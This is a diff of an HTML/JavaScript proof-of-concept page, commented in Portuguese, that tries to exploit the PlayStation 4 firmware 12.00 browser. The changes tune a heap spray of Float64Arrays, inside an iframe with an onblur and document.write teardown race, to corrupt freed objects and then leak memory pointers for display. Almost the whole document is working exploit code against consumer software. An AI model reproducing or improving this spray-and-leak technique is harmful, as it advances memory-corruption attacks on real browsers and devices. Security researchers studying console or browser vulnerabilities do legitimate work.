@@ -6,11 +6,11 @@
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - High-Speed Collision</h1>
+    <h1>PS4 12.00 - Heavy Payload</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>
 
     <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Fast Spray)</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Heavy Spray)</button>
     <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar</button>
 
     <hr>
@@ -26,13 +26,13 @@
 
         function prepareObjects() {
             controllers = [];
-            // Aumentamos para 8000 objetos para cobrir uma área maior da RAM
-            for(let i = 0; i < 8000; i++) {
-                let arr = new Float64Array(8);
+            // Criamos menos objetos, mas cada um é maior para dificultar a limpeza rápida
+            for(let i = 0; i < 3000; i++) {
+                let arr = new Float64Array(128); // Aumentado o tamanho individual
                 arr[0] = i; 
                 controllers.push(arr);
             }
-            statusPai.innerText = "8000 Objetos prontos.";
+            statusPai.innerText = "3000 Objetos pesados prontos.";
             statusPai.style.color = "blue";
             leakOutput.style.display = "none";
         }
@@ -55,15 +55,18 @@
                                 document.documentElement.webkitRequestFullscreen();
                             
                             window.onblur = function() {
-                                // SPRAY ULTRA-RÁPIDO
-                                // Usamos um loop mais simples para bater o tempo do GC
-                                let spray = new Array(15000);
-                                for(let i = 0; i < 15000; i++) {
-                                    // Criamos o array e já preenchemos para forçar a alocação imediata
-                                    spray[i] = new Float64Array(8).fill(${PATTERN});
-                                }
+                                // SPRAY DE ALTA PRESSÃO
+                                // Criamos blocos grandes de memória para "atropelar" o GC
+                                let spray = [];
+                                try {
+                                    for(let i = 0; i < 4000; i++) {
+                                        // Blocos de 512 bytes cada
+                                        let p = new Float64Array(64).fill(${PATTERN});
+                                        spray.push(p);
+                                    }
+                                } catch(e) {}
                                 
-                                // O teardown imediato é o segredo do seu sucesso anterior
+                                // O teardown precisa ser imediato
                                 document.open();
                                 document.write('<h1>FINALIZADO</h1>');
                                 document.close();
@@ -82,7 +85,6 @@
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                // Se não for o número original, pegamos o valor (mesmo que seja 0)
                 if (controllers[i][0] !== i) {
                     corrupted = controllers[i];
                     corruptedIndex = i;
@@ -101,14 +103,13 @@
                     new Float64Array(buf)[0] = val;
                     const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                     
-                    // Se for diferente de 0 e do padrão, é um endereço real
                     let isPointer = (hex !== "0000000000000000" && !hex.includes("414141"));
                     let style = isPointer ? "color:#fff; background:#a00;" : "";
                     
                     leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span><br>";
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: O GC limpou a memória. Tente novamente.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: GC muito rápido. Tente fechar outras abas do navegador.</span>";
             }
         }
     </script>
